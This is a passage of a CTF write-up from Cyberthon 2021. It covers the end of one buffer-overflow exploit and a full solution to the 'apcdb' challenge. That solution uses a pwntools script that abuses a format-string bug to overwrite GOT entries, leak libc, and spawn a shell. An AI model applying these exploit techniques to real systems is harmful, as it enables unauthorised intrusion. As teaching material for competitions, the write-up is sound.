</span><span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">10</span><span class="o">+</span><span class="sa">b</span><span class="s">"</span><span class="se">\0</span><span class="s">"</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4015a1</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>After getting <strong>shell</strong> we thus obtain:
Flag: <code class="language-plaintext highlighter-rouge">Cyberthon{th4t5_4_r34lly_l000ng_0rd3r_dud3_pl5_ch1ll}</code></p>

<h2 id="apcdb">apcdb</h2>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>We've found a network service that seems to be posing as a fake directory of APOCALYPSE members. 
Although it doesn't seem to be hooked up to any actual database, it does look a tad vulnerable. 
Could u try to break in anyway? Who knows, access to this server might come in useful.
</code></pre></div></div>

<p>Being the only person to have solved this during the actual CTF, of course I must do a writeup on it uwu.</p>

<h3 id="reconnaissance-3">Reconnaissance</h3>
<p>We are once again presented with a 64-bit binary with the following function:
<img src="/assets/Images/Cyberthon-2021/apcdb_main.png" alt="" /></p>

<p>Of course, not forgetting our checksec‚Ä¶
<img src="/assets/Images/Cyberthon-2021/apcdb_checksec.png" alt="" /></p>

<h3 id="vulnerability-analysis-1">Vulnerability Analysis</h3>
<p>‚ÄúThis is <strong>real</strong> similar to that <code class="language-plaintext highlighter-rouge">apcafe</code> challenge‚Äù, you say.</p>

<p>And you‚Äôd be right.</p>

<p>In fact there are only two key differences:</p>
<ul>
  <li>Lack of format string in <code class="language-plaintext highlighter-rouge">printf()</code> is a telltale sign of <strong>Format String Exploit</strong>.
    <ul>
      <li>We can use this to once again <strong>leak LIBC version</strong></li>
    </ul>
  </li>
  <li>You can only leak <strong>one</strong> address.</li>
</ul>

<h3 id="leaking-libc">Leaking LIBC</h3>
<p>Ideally when <strong>leaking LIBC</strong>, we want multiple addresses in a <strong>single</strong> connection.</p>

<p>This is because <strong>LIBC</strong> files are <strong>PIE</strong> meaning that their addresses are merely offsets added to a <strong>random</strong> <code class="language-plaintext highlighter-rouge">base address</code>.</p>

<p>If you instead retrieve addresses from <strong>multiple</strong> connections, the <strong>PIE bases</strong> are most definitely different, and you (probably) cannot use that to retrieve <strong>LIBC version</strong> from <a href="&quot;https://libc.blukat.me&quot;">libc.blukat.me</a></p>

<p>We can overcome this simply by overwriting the <a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html">GOT entry</a> of the <code class="language-plaintext highlighter-rouge">exit()</code> function, since <strong>partial RELRO</strong> security allows us to overwrite <code class="language-plaintext highlighter-rouge">.got.plt</code>.</p>

<p>This will in effect give us a never-ending loop, which is great because now we can do whatever we want &gt;:))).</p>

<p>For example, leaking our <strong>LIBC addresses</strong> as usual!</p>

<h3 id="the-exploit-2">The Exploit</h3>
<p>After we leak some nice addresses we will shove them into <a href="&quot;https://libc.blukat.me&quot;">libc.blukat.me</a> to get our dearest libc version:</p>

<p><img src="/assets/Images/Cyberthon-2021/apcdb_libc.png" alt="" /></p>

<p>(During the actual competition I forgot to change my connection to the <code class="language-plaintext highlighter-rouge">remote</code> server, which resulted in some very fun times as I tried to figure out why my offsets were pointing me to a wrong <strong>LIBC address</strong>. Be careful kids!)</p>

<p>And after that, as you can see on the right, it is absolutely trivial to get shell.</p>

<p>We just need to overwrite the <a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html">GOT entry</a> of <code class="language-plaintext highlighter-rouge">printf()</code> to our <code class="language-plaintext highlighter-rouge">system()</code> offset, after which we pass <code class="language-plaintext highlighter-rouge">"/bin/sh\x00"</code> in to call our shell program!</p>

<p>(Sidenote: I tried using <code class="language-plaintext highlighter-rouge">str_bin_sh</code>, but I got an absolutely dysfunctional shell which I spent debugging until the scoreboard was frozen :PPP)</p>

<p>Here‚Äôs the code used to carry out the exploit:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">r</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s">"aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg"</span><span class="p">,</span><span class="mi">30201</span><span class="p">)</span>
<span class="c1"># We leak the LIBC addresses as described here:
# https://github.com/VulnHub/ctf-writeups/blob/master/2016/sctf/pwn2.md
</span><span class="n">binary</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./apcdb"</span><span class="p">)</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span><span class="o">=</span><span class="s">"amd64"</span>
<span class="n">inp_offset</span><span class="o">=</span><span class="mi">6</span>
<span class="n">payload</span><span class="o">=</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="n">inp_offset</span><span class="p">,</span> <span class="p">{</span><span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"exit"</span><span class="p">]:</span><span class="mh">0x40083f</span><span class="p">})</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Lookup: "</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Lookup: "</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"%7$s"</span><span class="o">+</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"printf"</span><span class="p">]))</span> 
<span class="c1"># Align it properly or you die!
# Don't be like me in stacktheflags!
</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"for "</span><span class="p">)</span>
<span class="c1"># print(r.recvuntil("...")[:-10].ljust(8,b'\x00'))
</span><span class="n">printf</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"..."</span><span class="p">)[:</span><span class="o">-</span><span class="mi">10</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">printf</span><span class="p">))</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Lookup: "</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"%7$s"</span><span class="o">+</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"__libc_start_main"</span><span class="p">]))</span>
<span class="c1"># Align it properly or you die!
# Don't be like me in stacktheflags!
</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"for "</span><span class="p">)</span>
<span class="n">libc_start</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"..."</span><span class="p">)[:</span><span class="o">-</span><span class="mi">10</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_start</span><span class="p">))</span>
<span class="n">libc_base</span><span class="o">=</span><span class="n">libc_start</span><span class="o">-</span><span class="mh">0x21b10</span>
<span class="n">system</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x4f550</span>
<span class="n">str_bin_sh</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x1b3e1a</span> <span class="c1"># Bad shell. BAD SHELL &gt;:(
</span><span class="n">payload</span><span class="o">=</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="n">inp_offset</span><span class="p">,</span> <span class="p">{</span><span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"printf"</span><span class="p">]:</span><span class="n">system</span><span class="p">})</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p><img src="/assets/Images/Cyberthon-2021/apcdb_flag.png" alt="" /></p>

<p>Flag: ``</p>
:ET